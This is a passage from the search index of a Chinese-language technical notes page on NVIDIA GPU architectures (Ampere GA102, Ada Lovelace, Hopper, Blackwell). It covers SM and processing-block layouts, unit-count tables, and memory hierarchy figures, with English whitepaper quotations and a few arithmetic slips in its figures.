TFLOPS</code>\u3002</p>"},{"location":"hardware/gpgpu.html#ga102","title":"GA102","text":"<p>Whitepaper: NVIDIA AMPERE GA102 GPU ARCHITECTURE</p> <p>GA102 \u200b\u7684\u200b SM \u200b\u5305\u62ec\u200b\u56db\u4e2a\u200b PB\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5305\u62ec\u200b 16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c\u200b\u4e00\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit \u200b\u548c\u200b 4 \u200b\u4e2a\u200b SFU\u3002\u200b\u4e5f\u200b\u5c31\u200b\u662f\u4ece\u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5f00\u59cb\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b FP32/INT32 \u200b\u6df7\u5408\u200b\u7684\u200b core\uff0c\u200b\u4f7f\u5f97\u200b FP32 \u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u7ffb\u500d\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5cf0\u503c\u200b\u4e5f\u200b\u66f4\u200b\u96be\u200b\u8fbe\u5230\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fbe\u5230\u200b\u5cf0\u503c\u200b\u610f\u5473\u7740\u200b\u4e0d\u7528\u200b\u5230\u200b FP32/INT32 core \u200b\u7684\u200b INT32 \u200b\u90e8\u5206\u200b\u3002\uff08<code>GA10X includes FP32 processing on both datapaths, doubling the peak processing rate for FP32 operations. One datapath in each partition consists of 16 FP32 CUDA Cores capable of executing 16 FP32 operations per clock. Another datapath consists of both 16 FP32 CUDA Cores and 16 INT32 Cores, and is capable of executing either 16 FP32 operations OR 16 INT32 operations per clock. As a result of this new design, each GA10x SM partition is capable of executing either 32 FP32 operations per clock, or 16 FP32 and 16 INT32 operations per clock.</code>\uff09</p> <p> </p> Ampere \u200b\u67b6\u6784\u200b GA102 SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA NVIDIA AMPERE GA102 GPU ARCHITECTURE Figure 3\uff09 <p>GA102 \u200b\u6709\u200b 12 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e00\u5171\u200b\u662f\u200b 384 \u200b\u4f4d\u200b\u5bbd\u5ea6\u200b\u3002GA102 12 \u200b\u7ec4\u200b 512KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u6bcf\u7ec4\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0cL2 \u200b\u4e00\u5171\u200b\u662f\u200b 6144 KB\u3002\uff08<code>The memory subsystem of GA102 consists of twelve 32-bit memory controllers (384-bit total). 512 KB of L2 cache is paired with each 32-bit memory controller, for a total of 6144 KB on the full GA102 GPU.</code>\uff09\u3002</p> <p>GA102 \u200b\u7684\u200b shared memory \u200b\u5e26\u5bbd\u200b\u662f\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b 128 \u200b\u5b57\u8282\u200b\uff0c\u200b\u800c\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u662f\u200b 64\u3002\uff08<code>GA10x also features double the shared memory bandwidth compared to Turing (128 bytes/clock per SM versus 64 bytes/clock in Turing)</code>\uff09GeForce RTX 3080 (GA102) \u200b\u7684\u200b\u6bcf\u200b SM L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b 219 GB/s\uff08\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 8B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(1710 * 16 * 8 = 219\\) GB/s\uff09\uff0c\u200b\u800c\u200b GeForce RTX 2080 Super (TU104) \u200b\u7684\u200b\u6bcf\u200b SM L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b 116 GB/s\uff08\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 4B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(1815 * 16 * 4 = 166\\) GB/s\uff09\u3002\uff08<code>Total L1 bandwidth for GeForce RTX 3080 is 219 GB/sec versus 116 GB/sec for GeForce RTX 2080 Super.</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-ada-lovelace","title":"NVIDIA Ada Lovelace","text":"<p>Whitepaper: NVIDIA ADA GPU ARCHITECTURE</p> <p>Ada Lovelace \u200b\u67b6\u6784\u200b\u7684\u200b AD102 \u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>12 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 6 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1a\u200b\u4e00\u5171\u200b 144 \u200b\u4e2a\u200b SM\uff08<code>The full AD102 GPU includes 12 Graphics Processing Clusters (GPCs), 72 Texture Processing Clusters (TPCs), 144 Streaming Multiprocessors (SMs)</code>\uff09</li> <li>12 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e00\u5171\u200b 384 \u200b\u4f4d\u200b\uff08<code>a 384-bit memory interface with 12 32-bit memory controllers</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5305\u62ec\u200b 16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c1 \u200b\u4e2a\u200b\u7b2c\u56db\u4ee3\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU\uff08<code>Each SM in AD10x GPUs contain 128 CUDA Cores, one Ada Third-Generation RT Core, four Ada Fourth-Generation Tensor Cores, four Texture Units, a 256 KB Register File, and 128 KB of L1/Shared Memory</code>\uff0c<code>Like prior GPUs, the AD10x SM is divided into four processing blocks (or partitions), with each partition containing a 64 KB register file, an L0 instruction cache, one warp scheduler, one dispatch unit, 16 CUDA Cores that are dedicated for processing FP32 operations (up to 16 FP32 operations per clock), 16 CUDA Cores that can process FP32 or INT32 operations (16 FP32 operations per clock OR 16 INT32 operations per clock), one Ada Fourth-Generation Tensor Core, four Load/Store units, and a Special Function Unit (SFU) which executes transcendental and graphics interpolation instructions.</code>\uff09</li> <li>\u200b\u6b64\u5916\u200b\u6bcf\u4e2a\u200b SM \u200b\u8fd8\u6709\u200b 2 \u200b\u4e2a\u200b FP64 core\uff08<code>The AD102 GPU also includes 288 FP64 Cores (2 per SM) which are not depicted in the above diagram. The FP64 TFLOP rate is 1/64th the TFLOP rate of FP32 operations. The small number of FP64 Cores are included to ensure any programs with FP64 code operate correctly, including FP64 Tensor Core code.</code>\uff09</li> </ul> <p> </p> Ada Lovelace \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA ADA GPU ARCHITECTURE Figure 5\uff09"},{"location":"hardware/gpgpu.html#nvidia-hopper","title":"NVIDIA Hopper","text":"<p>Whitepaper: NVIDIA H100 Tensor Core GPU Architecture</p> <p>PPT: NVIDIA HOPPER GPU: SCALING PERFORMANCE</p> <p>H100 SXM5 \u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>TSMC 4N \u200b\u5236\u7a0b\u200b\uff0c80 billion transistor\uff08<code>The full GH100 GPU that powers the H100 GPU is fabricated using TSMC\u2019s 4N process customized for NVIDIA, with 80 billion transistors, a die size of 814 mm2, and higher frequency design.</code>\uff09</li> <li>HBM3 DRAM\uff0c5 \u200b\u4e2a\u200b stack\uff0c10 \u200b\u4e2a\u200b 512-bit memory controller\uff0c\u200b\u603b\u5171\u200b 80 GB \u200b\u5bb9\u91cf\u200b\uff08<code>6 HBM3 or HBM2e stacks, 12 512-bit Memory Controllers</code>\uff09</li> <li>H100 SXM5 \u200b\u6709\u200b 8 \u200b\u4e2a\u200b GPC\uff0c66 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b\u4e24\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b 132 \u200b\u4e2a\u200b SM\uff08<code>8 GPCs, 66 TPCs, 2 SMs/TPC, 132 SMs per GPU</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u90e8\u200b\u6709\u200b 16 \u200b\u4e2a\u200b INT32 \u200b\u5355\u5143\u200b\uff0c32 \u200b\u4e2a\u200b FP32 \u200b\u5355\u5143\u200b\uff0c16 \u200b\u4e2a\u200b FP64 \u200b\u5355\u5143\u200b\uff0c\u200b\u4e00\u4e2a\u200b Tensor Core\uff0c\u200b\u56db\u4e2a\u200b SFU</li> </ul> <p> </p> Hopper \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA H100 Tensor Core GPU Architecture Figure 7\uff09 <p>H100 \u200b\u6709\u200b 50MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u800c\u200b\u5b8c\u6574\u7248\u200b\u7684\u200b GH100 \u200b\u82af\u7247\u200b\u6709\u200b 60MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\uff08<code>A 50 MB L2 cache in H100 is 1.25x larger than A100\u2019s 40 MB L2.</code>\uff09</p> <p>\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u7565\u591a\u4e8e\u200b 128 \u200b\u5b57\u8282\u200b\uff0825 TB/s\uff0c114 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1620 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(25 / 114 / 1620 * 1e6 = 135\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>CUDA Kernel \u200b\u4e4b\u524d\u200b\u662f\u200b\u4e09\u4e2a\u200b\u5c42\u6b21\u200b\uff1aGrid\u3001Thread Block \u200b\u548c\u200b Thread\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u6574\u4e2a\u200b GPU\u3001SM \u200b\u548c\u200b CUDA Core\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5f15\u5165\u200b\u4e86\u200b Thread Block Cluster \u200b\u7684\u200b\u5c42\u6b21\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b\u56db\u4e2a\u200b\u5c42\u6b21\u200b\uff1aGrid\u3001Thread Block Cluster\u3001Thread Block \u200b\u548c\u200b Thread\u3002\uff08<code>H100 introduces a new Thread Block Cluster architecture that exposes control of locality at a granularity larger than a single Thread Block on a single SM.</code>\uff09\u200b\u5176\u4e2d\u200b Thread Block \u200b\u5bf9\u5e94\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u591a\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b\u591a\u4e2a\u200b SM\u3002\uff08<code>The Clusters in H100 run concurrently across SMs within a GPC. A GPC is a group of SMs in the hardware hierarchy that are always physically close together.</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-blackwell","title":"NVIDIA Blackwell","text":"<p>Whitepaper: NVIDIA Blackwell Architecture Technical Brief</p> <p>Datasheet: NVIDIA Blackwell Datasheet</p> <p>Datasheet: NVIDIA DGX B200 Datasheet</p>"},{"location":"hardware/gpgpu.html#sm","title":"SM \u200b\u53d1\u5c55\u200b\u5386\u53f2","text":"<p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u4e86\u200b\u5404\u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u53d1\u5c55\u200b\u5386\u7a0b\u200b\uff0c\u200b\u53d1\u5c04\u200b\u6570\u200b\u8868\u793a\u200b\u65b9\u6cd5\u200b\u4e3a\u200b Warp \u200b\u6570\u91cf\u200b\uff08W\uff09\u200b\u4e58\u4ee5\u200b\u6bcf\u4e2a\u200b Warp \u200b\u7684\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u6570\u200b\uff08I\uff09\uff1a</p> \u200b\u67b6\u6784\u200b \u200b\u5355\u7cbe\u5ea6\u200b \u200b\u53cc\u200b\u7cbe\u5ea6\u200b SFU LD/ST \u200b\u53d1\u5c04\u200b\u6570\u200b \u200b\u5355\u7cbe\u5ea6\u200b/\u200b\u53d1\u5c04\u200b\u6570\u200b Tesla 1.0 G80 8 0 2 N/A 1 W * 1 I 8 Tesla 2.0 GT200 8 1 2 N/A 1 W * 1 I 8 Fermi GF100 32 16 4 16 2 W * 1 I 16 Kepler GK210 192 64 32 32 4 W * 2 I 24 Maxwell GM204 (per PB) 32 1 8 8 1 W * 2 I 16 Maxwell GM204 (per SM) 128 4 32 32 4 W * 2 I 16 Pascal GP100 (per PB) 32 16 8 8 1 W * 2 I 16 Pascal GP100 (per SM) 64 32 16 16 2 W * 2 I 16 Volta GV100 (per PB) 16 8 4 8 1 W * 1 I 16 Volta GV100 (per SM) 64 32 16 32 4 W * 1 I 16 Turing TU102 (per PB) 16 0 4 4 1 W * 1 I 16 Turing TU102 (per SM) 64 2 16 16 4 W * 1 I 16 Ampere GA100 (per PB) 16 8 4 8 1 W * 1 I 16 Ampere GA100 (per SM) 64 32 16 32 4 W * 1 I 16 Ampere GA102 (per PB) 32 0 4 4 1 W * 1 I 32 Ampere GA102 (per SM) 128 2 16 16 4 W * 1 I 32 Ada Lovelace AD102 (per PB) 32 0 4 4 1 W * 1 I 32 Ada Lovelace AD102 (per SM) 128 2 16 16 4 W * 1 I 32 Hopper GH100 (per PB) 32 16 4 8 1 W * 1 I 32 Hopper GH100 (per SM) 128 64 16 32 4 W * 1 I 32 <p>\u200b\u6ce8\u200b\uff1aTU102\u3001GA102 \u200b\u548c\u200b AD102 \u200b\u7b49\u200b\u663e\u5361\u200b\u662f\u200b\u6e38\u620f\u5361\u200b\uff0c\u200b\u56e0\u6b64\u200b FP64 \u200b\u5355\u5143\u200b\u5f88\u5c11\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b\u3002</p> <p>\u200b\u5404\u200b\u67b6\u6784\u200b SM \u200b\u7684\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u6027\u80fd\u200b\uff08\u200b\u53c2\u8003\u200b Throughput of Native Arithmetic Instructions \u200b\u548c\u200b Matching CUDA arch and CUDA gencode for various NVIDIA architectures \u200b\u548c\u200b Throughput of Native Arithmetic Instructions CUDA 8.0 \u200b\u548c\u200b CUDA - Wikipedia\uff09</p> \u200b\u67b6\u6784\u200b \u200b\u534a\u200b\u7cbe\u5ea6\u200b \u200b\u5355\u7cbe\u5ea6\u200b \u200b\u53cc\u200b\u7cbe\u5ea6\u200b \u200b\u7279\u6b8a\u200b\u51fd\u6570\u200b Fermi (SM 2.0, GF100/GF110) N/A 32 16 4 Fermi (SM 2.1, GF104-108, GF114-119) N/A 48 4 8 Kepler (SM 3.0, GK104-GK107) N/A 192 8 32 Kepler (SM 3.2, GK20A) N/A 192 8 32 Kepler (SM 3.5, GK110, GK208) N/A 192 64 32 Kepler (SM 3.7, GK210) N/A 192 64 32 Maxwell (SM 5.0, GM107-108) N/A 128 4 32 Maxwell (SM 5.2, GM200-206) N/A 128 4 32 Maxwell (SM 5.3, GM20B) 256 128 4 32 Pascal (SM 6.0, GP100) 128 64 32 16 Pascal (SM 6.1, GP102-GP108) 2 128 4 32 Pascal (SM 6.2, GP10B) 256 128 4 32 Volta (SM 7.0, GV100) 128 64 32 16 Volta (SM 7.2, GV10B-GV11B) 128 64 32 16 Turing (SM 7.5, TU102-TU117) 128 64 2 16 Ampere (SM 8.0, GA100) 256 64 32 16 Ampere (SM 8.6, GA102-GA107) 256 128 2 16 Ada Lovelace (SM 8.9, AD102-AD107) 128 128 2 16 Hopper (SM 9.0, GH100) 256 128 64 16 <p>\u200b\u5404\u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b PB \u200b\u4e2d\u200b\u5305\u62ec\u200b\u7684\u200b\u5355\u5143\u200b\u6570\u91cf\u200b\uff1a</p> \u200b\u67b6\u6784\u200b FP32 INT32 FP32/INT32 FP64 LD/ST Tensor Core SFU Maxwell (GM204) 0 0 32 0 8 0 8 Pascal (GP100) 0 0 32 16 8 0 8 Volta (GV100) 16 16 0 8 8 2x 1st Gen 4 Turing (TU102) 16 16 0 0 4 2x 2nd Gen 4 Ampere (GA100) 16 16 0 8 8 1x 3rd Gen 4 Ampere (GA102) 16 0 16 0 4 1x 3rd Gen 4 Ada Lovelace (AD102) 16 0 16 0 4 1x 4th Gen 4 Hopper (GH100) 32 16 0 16 8 1x 4th Gen 4 <p>\u200b\u6ce8\u200b\uff1aVolta \u200b\u628a\u200b FP32/INT32 core \u200b\u62c6\u5206\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u4e24\u7c7b\u200b\u6307\u4ee4\u200b\uff0c\u200b\u800c\u200b Pascal \u200b\u4e0d\u884c\u200b\u3002\uff08<code>Unlike Pascal GPUs, which could not execute FP32 and INT32 instructions simultaneously, the Volta GV100 SM includes separate FP32 and INT32 cores, allowing simultaneous execution of FP32 and INT32 operations at full throughput, while also increasing instruction issue throughput.</code>\uff09</p> <p>\u200b\u5404\u200b\u82af\u7247\u200b\u7684\u200b SM \u200b\u6570\u91cf\u200b\u548c\u200b CUDA Core \u200b\u6570\u91cf\u200b\uff1a</p> <ul> <li>G80: 16 SM(8 TPC * 2 SM/TPC) * 8 = 128 CUDA core</li> <li>GF100: 16 SM(4 GPC * 4 SM/GPC) * 32 = 512 CUDA core</li> <li>GK210: 15 SM(15 SM) * 192 = 2730 CUDA core</li> <li>GM204: 16 SM(4 GPC * 4 SM/GPC) * 128(4 PB * 32 Core/PB) = 2048 CUDA core</li> <li>GP100: 60 SM(6 GPC * 5 TPC/GPC * 2 SM/TPC) * 64(2 PB * 32 Core/PB) = 3840 CUDA core</li> <li>GV100: 84 SM(6 GPC * 7 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 5376 CUDA core</li> <li>TU102: 72 SM(6 GPC * 6 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 4608 CUDA core</li> <li>GA100: 128 SM(8 GPC * 8 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 8192 CUDA core</li> <li>GA102: 84 SM(7 GPC * 6 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 10752 CUDA core</li> <li>AD102: 144 SM(12 GPC * 6 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 18432 CUDA core</li> <li>GH100: 144 SM(8 GPC * 9 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 18432 CUDA core</li> </ul> <p>\u200b\u5f88\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b\u5c42\u6b21\u7ed3\u6784\u200b\uff1a</p> <ul> <li>SM</li> <li>TPC - SM</li> <li>GPC - SM</li> <li>GPC - TPC - SM</li> </ul>"},{"location":"hardware/gpgpu.html#smpb","title":"SM/PB \u200b\u53d1\u5c55\u200b\u5386\u53f2","text":"<p>\u200b\u5982\u679c\u200b\u4ee5\u200b SM \u200b\u6216\u200b PB \u200b\u7684\u200b\u6700\u5c0f\u200b\u7c92\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u53d1\u5c55\u200b\u5386\u53f2\u200b\u662f\u200b\uff1a</p> <ul> <li>Tesla\uff1a\u200b\u4e00\u4e2a\u200b SM \u200b\u53ea\u6709\u200b Instruction cache \u200b\u548c\u200b Constant cache\uff0c8 \u200b\u4e2a\u200b CUDA core\uff0c2 \u200b\u4e2a\u200b SFU\uff0c16KB \u200b\u7684\u200b shared memory</li> <li>Fermi\uff1aInstruction Cache\uff0c\u200b\u4e24\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c\u200b\u6709\u200b 32 \u200b\u4e2a\u200b CUDA core\uff0c16 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU\uff0c64 KB \u200b\u7684\u200b shared memory/L1 cache</li> <li>Kepler\uff1aInstruction Cache\uff0c\u200b\u56db\u4e2a\u200b\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c\u200b\u6709\u200b 192 \u200b\u4e2a\u200b CUDA core\uff0c64 \u200b\u4e2a\u200b DP unit\uff0c32 \u200b\u4e2a\u200b SFU\uff0c32 \u200b\u4e2a\u200b LD/ST\uff0c65536 \u200b\u6216\u200b 131072 * 32 bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c64KB \u200b\u6216\u8005\u200b 128KB \u200b\u7684\u200b shared memory/L1 cache\uff0c48KB \u200b\u7684\u200b readonly data cache</li> <li>Maxwell\uff1a\u200b\u5f00\u59cb\u200b\u62c6\u5206\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c1 \u200b\u4e2a\u200b DP unit\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c8 \u200b\u4e2a\u200b SFU</li> <li>Pascal\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c32768 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c16 \u200b\u4e2a\u200b DP unit\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c8 \u200b\u4e2a\u200b SFU</li> <li>Volta\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b L0 Instruction Cache\uff0c\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Turing\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Ampere\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Ada Lovelace\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Hopper\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c16 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> </ul>"},{"location":"hardware/gpgpu.html#_1","title":"\u5185\u5b58\u200b\u5c42\u6b21","text":"\u67b6\u6784\u200b L2 \u200b\u5927\u5c0f\u200b L2 B/clk L2 \u200b\u5e26\u5bbd\u200b \u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b Kepler (GK110) 1536 KB ? ? ? Maxwell (GM200) 3072 KB ? ? ? Pascal (GP100, P100) 4096 KB ? ? 732 GB/s Volta (GV100, V100) 6144 KB 2048 3133.440 GB/s 900 GB/s Turing (TU102) ? ? ? ? Ampere (GA100, A100) 40960 KB 5120 7219.200 GB/s 1555 GB/s Ampere (GA102) ? ? ? ? Ada Lovelace (AD102, L40) 98304 KB ? ? 864 GB/s Hopper (GH100, H100 SXM5) 51200 KB ? ? 3352 GB/s <p>\u200b\u5907\u6ce8\u200b\uff1a</p> <ul> <li>L2 \u200b\u5e26\u5bbd\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\uff1a\u200b\u9891\u7387\u200b * \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b\u5b57\u8282\u6570\u200b\u3002</li> <li><code>A100 2.3x L2 BW vs V100</code>: \\(7219.200 / 3133.40 = 2.3\\)</li> <li><code>A100 6.7x L2 capacity vs V100</code>: \\(40960 / 6144 = 6.7\\)</li> <li><code>A100 1.7x DRAM BW vs V100</code>: \\(1555 / 900 = 1.7\\)</li> </ul>"},{"location":"hardware/gpgpu.html#control-code","title":"Control Code","text":"<p>\u200b\u524d\u200b\u6587\u200b\u63d0\u5230\u200b\uff0c\u200b\u4ece\u200b Kepler \u200b\u67b6\u6784\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6307\u4ee4\u96c6\u200b\u52a0\u5165\u200b\u4e86\u200b Control Code \u200b\u4fe1\u606f\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u8c03\u5ea6\u200b\u3002\u200b\u4e0b\u9762\u200b\u6765\u200b\u7ed3\u5408\u200b\u4e00\u4e9b\u200b\u7528\u200b CuAssembler \u200b\u5f97\u5230\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u6765\u200b\u5206\u6790\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#stall-count","title":"Stall count","text":"<p>\u200b\u9996\u5148\u200b\u662f\u200b Stall Count\uff0c\u200b\u4ee5\u200b Ampere SM8.0 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u91cc\u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b LD/ST 